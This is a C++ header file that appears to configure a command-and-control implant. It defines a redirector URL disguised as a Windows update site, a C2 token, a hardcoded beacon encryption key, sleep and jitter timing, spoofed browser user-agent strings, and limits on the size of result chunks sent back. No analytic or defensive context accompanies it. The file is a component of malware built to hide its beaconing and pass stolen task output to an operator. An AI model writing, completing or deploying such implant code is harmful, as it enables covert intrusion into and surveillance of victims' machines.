#pragma once

#include <string>
#include <vector>

namespace core {

// C2 Configuration
const std::string REDIRECTOR_URL = "https://windows-updates.vercel.app/";
const std::string API_KEY = "SECRET_C2_TOKEN_2026";
const double C2_FETCH_BACKOFF = 60.0;

// Beacon Configuration
const unsigned char BEACON_KEY[] = "0123456789abcdef0123456789abcdef";
const int SLEEP_BASE = 5;    // seconds
const int JITTER_PCT = 20;   // %

// HTTP Configuration
const std::vector<std::string> USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
};

// Task Configuration
const size_t MAX_PENDING_RESULTS = 25;
const size_t MAX_CHUNK_SIZE = 1024 * 1024;

} // namespace core
